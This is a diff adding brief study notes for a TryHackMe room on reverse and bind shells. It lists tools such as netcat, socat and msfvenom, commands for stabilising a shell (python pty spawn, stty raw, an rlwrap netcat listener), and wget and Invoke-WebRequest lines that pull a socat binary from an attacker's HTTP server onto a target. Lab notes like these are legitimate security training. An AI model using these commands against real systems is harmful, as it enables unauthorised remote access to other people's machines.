@@ -1,0 +1,37 @@
+# Short hands notes for What the Shell room on THM
+
+# Remote server sending remote CLi access - Reverse shell
+
+# Opening port on remote server for Cli access - Bind shell
+
+# /usr/share/webshells
+
+# Tools mentioned Netcat, Socat, Msf multi/handler, msfvenom 
+
+# Payload all the things - reverse shell
+
+# Pentestmonkey - Reverse Shell Cheatsheet
+
+Reverse shells:
+
+# Python:
+
+# python -c 'import pty;pty.spawn("/bin/bash")'
+# export TERM=xterm
+# stty raw -echo; fg
+
+# rlwrap:
+
+# rlwrap nc -lvnp <port>
+# stty raw -echo; fg
+
+# socat:
+
+# sudo python3 -m http.server 80
+# Linux - wget <LOCAL-IP>/socat -O /tmp/socat
+# Windows - Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
+
+# stty - change and print terminal line settings
+# stty -a
+# stty rows <number>
+# stty cols <number>
